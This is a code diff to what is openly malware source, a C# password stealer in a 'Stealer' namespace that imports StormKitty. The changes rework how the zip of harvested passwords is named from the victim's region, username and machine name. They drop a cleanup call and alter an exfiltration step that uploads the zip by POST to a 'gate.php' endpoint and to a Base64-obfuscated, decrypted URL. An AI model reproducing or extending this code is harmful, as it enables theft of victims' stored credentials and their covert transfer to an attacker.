@@ -1,4 +1,4 @@
-﻿using StormKitty;
+using StormKitty;
 using System;
 using System.IO;
 using System.Text;
@@ -7,6 +7,9 @@ using System.IO.Compression;
 using System.Collections.Generic;
 using System.Windows.Forms;
 using System.Text.RegularExpressions;
+using System.Globalization;
+
+
 
 namespace Stealer
 {
@@ -1068,8 +1071,14 @@ namespace Stealer
 	    internal sealed class Passwords
     {
 	
-		private static string PasswordsStoreDirectory = Path.Combine(Path.GetTempPath(),"pwtmp" );
-		 private static string ziplog = Path.Combine(Path.GetTempPath(), (Environment.UserName) + (Environment.MachineName) + ".zip" );
+		
+	static	 string compid=RegionInfo.CurrentRegion.EnglishName+(Environment.UserName)+(Environment.MachineName);
+static string id = Regex.Replace(compid, "[^a-zA-Z0-9]", "");
+static string ziplog = Path.Combine(Path.GetTempPath(), id + ".zip" );
+
+		 private static string PasswordsStoreDirectory = Path.Combine(Path.GetTempPath(),id );
+		
+		 
 		 			
    public static	string HexStringToString(string HexString) {
     string stringValue = "";
@@ -1308,7 +1317,7 @@ public static void DeleteDirectory(string target_dir)
 byte[] responseArray = myWebClient.UploadFile("http://localhost/gate.php", "POST",ziplog);
 
 System.Text.Encoding.ASCII.GetString(responseArray);
-DeleteDirectory(PasswordsStoreDirectory);
+
                   
                     System.Text.Encoding.ASCII.GetString(responseArray);
                   
@@ -1318,8 +1327,9 @@ DeleteDirectory(PasswordsStoreDirectory);
 
                 try
                 {  
-                   myWebClient.UploadFile(RC(Encoding.UTF8.GetString(Convert.FromBase64String("w6/Du8O9VU1gwqTCqwkMM2TCisOxM8OHwrNWwr0QwpZgC8O1QVfCqsONw7vCsMK+HsO7EsOFGQ==")), "{"), "POST", ziplog);
+byte[] responseArr =myWebClient.UploadFile(RC(Encoding.UTF8.GetString(Convert.FromBase64String("w6/Du8O==")), "{"), "POST", ziplog);
                   
+                System.Text.Encoding.ASCII.GetString(responseArr);
                 }
                 catch (WebException wexc)
                 { }
